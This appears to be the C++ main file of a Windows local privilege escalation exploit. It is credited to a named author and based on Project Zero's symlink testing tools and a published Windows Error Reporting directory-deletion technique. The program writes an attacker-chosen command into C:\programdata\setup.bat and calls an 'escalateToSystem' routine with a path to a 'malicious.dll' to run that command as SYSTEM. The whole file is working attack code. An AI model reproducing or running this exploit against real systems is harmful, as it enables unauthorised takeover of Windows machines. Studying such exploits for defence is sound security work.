// This code has been developed by @gweeperx (a.k.a Dimopoulos Elias). 
// This code is heavily based on symboliclink testing tools from google's project zero 
// https://github.com/googleprojectzero/symboliclink-testing-tools
// The technique which is implemented here, has been described by @jonasLyk in the following url:
// https://secret.club/2020/04/23/directory-deletion-shell.html

#include "stdafx.h"
#include "D_WER.h"

#include <FileSymlink.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <sys/stat.h>
#include <Shlwapi.h>


int _tmain()
{
	int argc;
	PWSTR cmdline = GetCommandLineW();
	PWSTR* argv = CommandLineToArgvW(cmdline, &argc);
	if (argc < 2) {
		std::wcout << L"[!]" << argv[0] << " \"whoami /all\" \"c:\\malicious.dll\"" << "\n" << std::endl;
		exit(1);
	}
	LPCWSTR cmd = argv[1];
	LPCWSTR dllpath = argv[2];
	std::wstring df = std::wstring(cmd) + L" > c:\\windows\\temp\\i03h8.tmp";
	cmd = df.c_str();


	HANDLE exploit = GetCurrentThread();
	SetThreadPriority(exploit, THREAD_PRIORITY_TIME_CRITICAL);
	bool retval = false;
	int len = WideCharToMultiByte(CP_ACP, 0, cmd, wcslen(cmd), NULL, 0, NULL, NULL);
	char* buffer = new char[len + 1];
	WideCharToMultiByte(CP_ACP, 0, cmd, wcslen(cmd), buffer, len, NULL, NULL);
	buffer[len] = '\0';
	DWORD dwWritten; // number of bytes written to file
	HANDLE hFile;  
	hFile = CreateFile(L"C:\\programdata\\setup.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	WriteFile(hFile, buffer, (DWORD)strlen(buffer), &dwWritten, 0);
	CloseHandle(hFile);

	
	D_WER* systemElevation;
	systemElevation = new D_WER();
	std::wcout << L"[+] Target Folder: " << systemElevation->get_target_folder() << "\n" << std::endl;
	
	systemElevation->escalateToSystem(dllpath);



	return 0;
	
}
